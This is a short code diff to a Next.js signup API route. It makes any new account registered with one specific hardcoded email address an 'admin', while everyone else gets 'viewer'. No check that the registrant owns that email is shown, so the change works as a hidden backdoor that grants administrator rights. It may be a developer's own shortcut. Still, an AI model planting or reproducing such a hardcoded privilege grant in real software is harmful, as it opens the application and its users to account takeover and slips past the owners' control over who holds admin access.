@@ -31,7 +31,7 @@ export async function POST(req: NextRequest) {
       email,
       username: slugify(username) || username,
       passwordHash,
-      role: 'viewer',
+      role: email.toLowerCase() === 'cssurya2006@gmail.com' ? 'admin' : 'viewer',
     }).returning({ id: users.id, email: users.email, username: users.username, role: users.role })
 
     return NextResponse.json({ user: newUser[0] }, { status: 201 })
